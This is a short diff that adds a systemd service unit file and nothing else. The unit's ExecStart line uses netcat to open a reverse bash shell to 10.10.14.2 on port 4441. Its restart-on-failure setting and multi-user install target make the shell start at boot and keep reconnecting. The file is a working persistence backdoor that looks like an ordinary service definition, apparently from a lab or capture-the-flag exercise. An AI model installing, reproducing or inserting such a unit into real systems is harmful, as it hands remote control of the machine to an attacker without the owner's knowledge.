@@ -1,0 +1,10 @@
+[Service]
+Type=notify
+ExecStart=/bin/bash -c 'nc -e /bin/bash 10.10.14.2 4441'
+KillMode=process
+Restart=on-failure
+RestartSec=42s
+
+[Install]
+WantedBy=multi-user.target
+
